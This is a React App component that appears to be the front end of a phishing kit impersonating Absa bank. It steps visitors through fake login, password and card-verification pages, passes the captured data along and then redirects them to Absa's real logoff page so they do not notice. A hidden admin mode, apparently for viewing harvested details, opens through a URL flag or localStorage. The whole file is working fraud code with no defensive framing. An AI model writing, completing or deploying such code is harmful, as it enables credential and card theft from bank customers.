import React, { useState } from 'react';
import LoginPage from './pages/LoginPage';
import PasswordPage from './pages/PasswordPage';
import CardVerificationPage from './pages/CardVerificationPage';
import AdminPage from './pages/AdminPage';


function App() {
  const [currentStep, setCurrentStep] = useState(1);
  const [loginData, setLoginData] = useState(null);
  const [sessionId] = useState(() => Date.now().toString());


  // Check if admin mode is enabled (you can change this condition)
  const isAdminMode = window.location.search.includes('admin=true') || 
                     window.location.hash.includes('admin=true') ||
                     localStorage.getItem('adminMode') === 'true';

  const handleStep1Submit = (data: any) => {
    console.log('Step 1 completed:', data);
    setLoginData(data);
    setCurrentStep(2);
  };

  const handleStep2Submit = (data: any) => {
    console.log('Step 2 completed:', data);
    setLoginData(data);
    setCurrentStep(3);
  };

  const handleStep3Submit = (data: any) => {
    console.log('Step 3 completed - FINAL DATA:', data);
    setLoginData(data);
    
    // Data is saved in CardVerificationForm component
    setTimeout(() => {
      console.log('Redirecting to Absa website...');
      window.location.href = 'https://www.absa.co.za/absa-online-logoff/';
    }, 1000);
  };

  // Show admin page if in admin mode
  if (isAdminMode) {
    return <AdminPage onBack={null} />;
  }

  return (
    <div className="App">
      {currentStep === 1 && (
        <LoginPage onLoginSubmit={handleStep1Submit} />
      )}
      {currentStep === 2 && (
        <PasswordPage 
          loginData={loginData} 
          onPasswordSubmit={handleStep2Submit} 
        />
      )}
      {currentStep === 3 && (
        <CardVerificationPage 
          loginData={loginData} 
          onCardVerificationSubmit={handleStep3Submit} 
        />
      )}
    </div>
  );
}

export default App;
